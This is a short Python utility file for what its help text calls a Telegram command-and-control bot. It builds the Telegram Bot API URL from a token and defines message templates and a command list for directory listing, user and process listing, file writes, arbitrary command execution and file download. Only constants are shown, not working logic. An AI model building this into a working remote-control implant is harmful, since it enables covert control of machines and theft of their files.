# utils.py

from authorization import TOKEN, ADMIN_IDS

URL = "https://api.telegram.org/bot{}".format(TOKEN)

# HTML Templates for messages
DIR_HTML = "<b>Directory Listing</b>\n<i>Dir: {}</i>\n<b>Items:</b>\n\n"
USR_HTML = "<b>Active Users Listing</b>\n<b>Users:</b>\n\n"
PCS_HTML = "<b>Running Processes Listing</b>\n<b>Processes:</b>\n\n"
WRT_HTML = "<b>Write Status: </b>"
EXEC_HTML = "<b>Command Execution</b>\n<i>$ {}</i>\n<b>Output:</b>\n\n"

# Help message listing all commands
HELP = ("<b>Telegram CnC BOT</b>\n"
        "Use:\n"
        "<code>ls [path]</code> - Directory listing\n"
        "<code>users</code> - Show active users\n"
        "<code>processes</code> - Show running processes\n"
        "<code>write [path] [data]</code> - Write to file\n"
        "<code>exec [command]</code> - Execute command\n"
        "<code>download [path]</code> - Download file\n\n"
        "<code>terminate</code> - Exit application\n")